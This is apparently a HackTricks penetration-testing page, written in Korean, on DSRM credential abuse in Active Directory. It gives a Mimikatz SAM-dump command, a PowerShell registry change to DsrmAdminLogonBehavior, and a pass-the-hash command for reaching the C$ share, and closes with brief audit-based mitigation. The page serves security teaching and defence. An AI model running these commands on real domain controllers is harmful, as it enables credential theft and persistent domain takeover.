# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

모든 도메인 컨트롤러에는 Directory Services Restore Mode(DSRM) administrator account가 있습니다. 이 계정의 password는 도메인 컨트롤러 승격 중에 설정되며 Active Directory domain accounts와는 별개입니다.<sup>[[1]](#references)</sup>

도메인 컨트롤러를 administrative control할 수 있는 attacker는 로컬 SAM database를 dump하고 DSRM Administrator NTLM hash를 복구할 수 있습니다. 다음 Mimikatz command가 해당 작업을 수행합니다:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
기본적으로 DSRM 계정은 복원 모드용으로 사용됩니다. `DsrmAdminLogonBehavior`를 `2`로 설정하면 도메인 컨트롤러가 정상적으로 실행 중일 때 이 로컬 계정으로 인증할 수 있습니다. 값을 변경하기 전에 확인합니다:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
복구된 hash는 pass-the-hash 세션에서 관리용 `C$` share와 같은 resource에 액세스하는 데 사용할 수 있습니다. 이 local account에는 domain controller의 computer name을 `/domain` 값으로 사용합니다:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## 완화

- `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`에 대한 변경 사항을 감사하세요. 키의 SACL이 **Set Value** 작업을 감사하도록 구성된 경우 보안 이벤트 4657에 레지스트리 값 수정이 기록됩니다.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Directory Services Restore Mode 관리자 암호 재설정](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: 교묘한 Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: 교묘한 Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: 이벤트 4657 — 레지스트리 값이 수정됨](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
